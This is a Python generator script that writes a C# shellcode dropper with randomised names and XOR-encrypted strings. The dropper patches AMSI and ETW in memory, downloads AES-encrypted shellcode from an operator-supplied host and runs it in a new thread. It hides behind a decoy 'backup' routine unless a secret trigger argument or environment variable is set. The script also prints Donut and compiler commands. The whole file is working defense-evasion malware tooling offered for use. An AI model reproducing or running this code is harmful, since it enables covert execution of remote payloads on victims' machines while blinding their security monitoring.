#!/usr/bin/env python3
import os, base64, random, string, argparse, re
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def rand_str(min_len=5, max_len=12, existing=None):
    existing = existing or set()
    while True:
        s = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(min_len, max_len)))
        if s not in existing:
            existing.add(s)
            return s

def xor_encrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def encrypt_aes(data: bytes) -> tuple:
    pad = 16 - (len(data) % 16)
    data += bytes([pad]) * pad
    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()
    return key, iv, encrypted

def comment_debug_lines(code: str) -> str:
    lines = code.splitlines(True)
    new_lines = []
    for line in lines:
        stripped = line.lstrip()
        if stripped.startswith("Console.WriteLine"):
            new_lines.append("//" + line)
        else:
            new_lines.append(line)
    return ''.join(new_lines)

def generate_final_dropper(lhost, lport, urlpath, payload_args, aes_key_b64, aes_iv_b64, trigger_arg, trigger_env, xor_key):
    payload_url = f"http://{lhost}:{lport}/{urlpath}"
    used = set()
    cls = rand_str(6,12,used)
    xstr = rand_str(6,10,used)
    bypass_amsi = rand_str(6,10,used)
    bypass_etw = rand_str(6,10,used)
    null_provider = rand_str(6,10,used)
    build_amsi_patch = rand_str(6,10,used)
    build_etw_patch  = rand_str(6,10,used)
    run_shell = rand_str(6,10,used)
    download_and_exec = rand_str(6,10,used)
    main = "Main"
    bkup = rand_str(6,10,used)
    trigger = rand_str(6,10,used)
    args_var = rand_str(4,8,used)

    strings = [
        "%USERPROFILE%\\Documents",
        "%TEMP%\\Backup",
        trigger_arg,
        trigger_env,
        payload_url,
        payload_args,
        "amsi.dll",
        "ntdll.dll",
        "EtwEventWrite"
    ]
    enc_strs = []
    for s in strings:
        enc = xor_encrypt(s.encode(), xor_key)
        cs_arr = "{" + ", ".join(f"0x{b:02x}" for b in enc) + "}"
        enc_strs.append(cs_arr)

    amsi_builder = """
        byte[] p = new byte[6];
        p[0] = 0xB8;
        p[1] = 0x00;
        p[2] = 0x00;
        p[3] = 0x00;
        p[4] = 0x00;
        p[5] = 0xC3;
        return p;"""

    etw_builder = """
        byte[] p = new byte[3];
        p[0] = 0x31;
        p[1] = 0xC0;
        p[2] = 0xC3;
        return p;"""

    raw_code = f"""
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

public class {cls}
{{
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    static extern IntPtr GetProcAddressByName(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    static extern IntPtr GetProcAddressByOrdinal(IntPtr hModule, IntPtr lpProcOrdinal);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static string {xstr}(byte[] d, byte k)
    {{
        byte[] r = new byte[d.Length];
        int s = 0, t = d.Length-1;
        for(int i=0;i<d.Length;i++)
        {{
            int p = (i*7+3)%d.Length;
            r[p] = (byte)(d[p]^k);
            s += r[p]%256;
            t ^= s;
        }}
        return Encoding.UTF8.GetString(r);
    }}

    static byte[] {build_amsi_patch}() {{{amsi_builder}}}
    static byte[] {build_etw_patch}()  {{{etw_builder}}}

    static void {bypass_amsi}()
    {{
        try
        {{
            byte k = (byte){xor_key};
            string dll = {xstr}(new byte[] {enc_strs[6]}, k);
            Console.WriteLine("[*] AMSI bypass: loading " + dll);
            IntPtr h = LoadLibrary(dll);
            if (h == IntPtr.Zero) {{ Console.WriteLine("[!] LoadLibrary failed"); return; }}
            IntPtr a = GetProcAddressByOrdinal(h, (IntPtr)1);
            Console.WriteLine("[*] AMSI bypass: ordinal 1 addr = 0x" + a.ToString("X"));
            if (a == IntPtr.Zero) {{ Console.WriteLine("[!] GetProcAddress (ordinal 1) failed"); return; }}
            byte[] patch = {build_amsi_patch}();
            Console.WriteLine("[*] AMSI patch bytes: " + BitConverter.ToString(patch));
            uint old;
            if (!VirtualProtect(a, (UIntPtr)patch.Length, 0x40, out old)) {{ Console.WriteLine("[!] VirtualProtect failed"); return; }}
            Marshal.Copy(patch, 0, a, patch.Length);
            VirtualProtect(a, (UIntPtr)patch.Length, old, out old);
            Console.WriteLine("[+] AMSI bypass succeeded");
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] AMSI bypass error: " + ex.Message); }}
    }}

    static void {bypass_etw}()
    {{
        try
        {{
            byte k = (byte){xor_key};
            string dll = {xstr}(new byte[] {enc_strs[7]}, k);
            string fnc = {xstr}(new byte[] {enc_strs[8]}, k);
            Console.WriteLine("[*] ETW bypass: loading " + dll);
            IntPtr h = LoadLibrary(dll);
            if (h == IntPtr.Zero) {{ Console.WriteLine("[!] LoadLibrary failed"); return; }}
            IntPtr a = GetProcAddressByName(h, fnc);
            Console.WriteLine("[*] ETW bypass: proc addr = 0x" + a.ToString("X"));
            if (a == IntPtr.Zero) {{ Console.WriteLine("[!] GetProcAddress failed"); return; }}
            byte[] patch = {build_etw_patch}();
            uint old;
            if (!VirtualProtect(a, (UIntPtr)patch.Length, 0x40, out old)) {{ Console.WriteLine("[!] VirtualProtect failed"); return; }}
            Marshal.Copy(patch, 0, a, patch.Length);
            VirtualProtect(a, (UIntPtr)patch.Length, old, out old);
            Console.WriteLine("[+] ETW bypass succeeded");
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] ETW bypass error: " + ex.Message); }}
    }}

    static void {null_provider}()
    {{
        try
        {{
            Type appDomainType = typeof(AppDomain).Assembly.GetType("System.AppDomain");
            if (appDomainType == null) {{ Console.WriteLine("[!] Could not get System.AppDomain type"); return; }}
            string[] fields = {{ "s_amsiProvider", "_amsiProvider", "s_amsiContext", "_amsiContext" }};
            foreach (var fieldName in fields)
            {{
                FieldInfo field = appDomainType.GetField(fieldName, BindingFlags.NonPublic | BindingFlags.Static);
                if (field != null)
                {{
                    field.SetValue(null, null);
                    Console.WriteLine("[+] AMSI provider nulled via " + fieldName);
                    return;
                }}
            }}
            Console.WriteLine("[!] No known AMSI provider field found");
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] NullAmsiProvider error: " + ex.Message); }}
    }}

    static void {run_shell}(byte[] code)
    {{
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)code.Length, 0x1000 | 0x2000, 0x40);
        if (addr == IntPtr.Zero) {{ Console.WriteLine("[!] VirtualAlloc failed"); return; }}
        Marshal.Copy(code, 0, addr, code.Length);
        Console.WriteLine("[*] Shellcode copied to 0x" + addr.ToString("X"));
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero) {{ Console.WriteLine("[!] CreateThread failed"); return; }}
        Console.WriteLine("[*] Shellcode thread started");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("[+] Shellcode thread returned");
        Console.WriteLine("[*] Press Enter to exit...");
        Console.ReadLine();
    }}

    static void {bkup}()
    {{
        try
        {{
            byte k = (byte){xor_key};
            string src = Environment.ExpandEnvironmentVariables({xstr}(new byte[] {enc_strs[0]}, k));
            string dst = Environment.ExpandEnvironmentVariables({xstr}(new byte[] {enc_strs[1]}, k));
            Console.WriteLine("[*] Backup: " + src + " -> " + dst);
            if(!Directory.Exists(src)) {{ Console.WriteLine("[!] Source missing"); return; }}
            if(!Directory.Exists(dst)) Directory.CreateDirectory(dst);
            int cnt = 0;
            foreach(string f in Directory.GetFiles(src,"*.*",SearchOption.TopDirectoryOnly))
            {{
                File.Copy(f, Path.Combine(dst,Path.GetFileName(f)), true);
                cnt++;
            }}
            Console.WriteLine("[+] Backup: " + cnt + " files copied");
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] Backup error: " + ex.Message); }}
    }}

    static bool {trigger}(string[] {args_var})
    {{
        byte k = (byte){xor_key};
        string t = {xstr}(new byte[] {enc_strs[2]}, k);
        string e = {xstr}(new byte[] {enc_strs[3]}, k);
        Console.WriteLine("[*] Trigger arg: " + ({args_var}!=null && {args_var}.Length>0 ? {args_var}[0] : "null") + ", expected=" + t);
        if({args_var}!=null && {args_var}.Length>0 && {args_var}[0]==t) return true;
        if(Environment.GetEnvironmentVariable(e)!=null) return true;
        return false;
    }}

    static void {download_and_exec}()
    {{
        try
        {{
            byte k = (byte){xor_key};
            string url = {xstr}(new byte[] {enc_strs[4]}, k);
            string argsStr = {xstr}(new byte[] {enc_strs[5]}, k);
            Console.WriteLine("[*] Downloading " + url);
            using (WebClient wc = new WebClient())
            {{
                wc.Proxy = null;
                wc.UseDefaultCredentials = false;
                byte[] enc = wc.DownloadData(url);
                Console.WriteLine("[*] Downloaded " + enc.Length + " bytes");
                byte[] key = Convert.FromBase64String("{aes_key_b64}");
                byte[] iv  = Convert.FromBase64String("{aes_iv_b64}");
                byte[] dec;
                using (Aes aes = Aes.Create())
                {{
                    aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                    using (MemoryStream ms = new MemoryStream())
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {{
                        cs.Write(enc,0,enc.Length); cs.FlushFinalBlock();
                        dec = ms.ToArray();
                    }}
                }}
                Console.WriteLine("[*] Decrypted " + dec.Length + " bytes");
                {null_provider}();
                {bypass_amsi}();
                {bypass_etw}();
                Console.WriteLine("[*] Running shellcode...");
                {run_shell}(dec);
            }}
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] Payload execution failed: " + ex.ToString()); }}
    }}

    static void {main}(string[] {args_var})
    {{
        Console.WriteLine("[DEBUG] Dropper started.");
        if({trigger}({args_var}))
            {download_and_exec}();
        else
            {bkup}();
    }}
}}
"""
    return comment_debug_lines(raw_code)

def main():
    parser = argparse.ArgumentParser(description="Generate a C# shellcode dropper with AMSI/ETW bypass")
    parser.add_argument("--binary", required=True, help="Path to shellcode binary (e.g., Donut output)")
    parser.add_argument("--lhost", required=True, help="Host serving encrypted shellcode")
    parser.add_argument("--lport", type=int, required=True, help="Port")
    parser.add_argument("--urlpath", default="rubeus_enc.bin", help="URL path")
    parser.add_argument("--args", default="", help="Arguments for the shellcode (if supported)")
    parser.add_argument("--output", default="dropper.cs", help="Output C# file")
    p = parser.parse_args()

    if not os.path.exists(p.binary):
        print(f"[!] Binary not found: {p.binary}")
        return
    with open(p.binary, "rb") as f:
        data = f.read()
    aes_key, aes_iv, enc_data = encrypt_aes(data)
    aes_key_b64 = base64.b64encode(aes_key).decode()
    aes_iv_b64 = base64.b64encode(aes_iv).decode()

    enc_filename = os.path.splitext(os.path.basename(p.binary))[0] + "_enc.bin"
    with open(enc_filename, "wb") as f:
        f.write(enc_data)
    print(f"[+] Encrypted shellcode saved to {enc_filename} (host this file)")

    trigger_arg = "--" + ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    trigger_env = ''.join(random.choice(string.ascii_uppercase) for _ in range(8)) + "_MODE"
    xor_key = random.randint(1, 255)

    code = generate_final_dropper(p.lhost, p.lport, p.urlpath, p.args, aes_key_b64, aes_iv_b64, trigger_arg, trigger_env, xor_key)
    with open(p.output, "w") as f:
        f.write(code)

    print(f"[+] Dropper written to {p.output}")
    print(f"[+] Trigger argument: {trigger_arg}")
    print(f"[+] Trigger env variable: {trigger_env}=1")
    print(f"[+] Payload URL: http://{p.lhost}:{p.lport}/{p.urlpath}")
    if p.args:
        print(f"[+] Payload arguments (baked into shellcode): {p.args}")

    print("\n[*] If using Donut, generate shellcode with:")
    if p.args:
        print(f"    donut -i <payload.exe> -p \"{p.args}\" -o payload.bin")
    else:
        print(f"    donut -i <payload.exe> -o payload.bin")
    print("\n[*] Compile on Windows (x64):")
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /out:RefractionMirage.exe {p.output}")
    print(f"\n[*] Then run: RefractionMirage.exe {trigger_arg}")

if __name__ == "__main__":
    main()
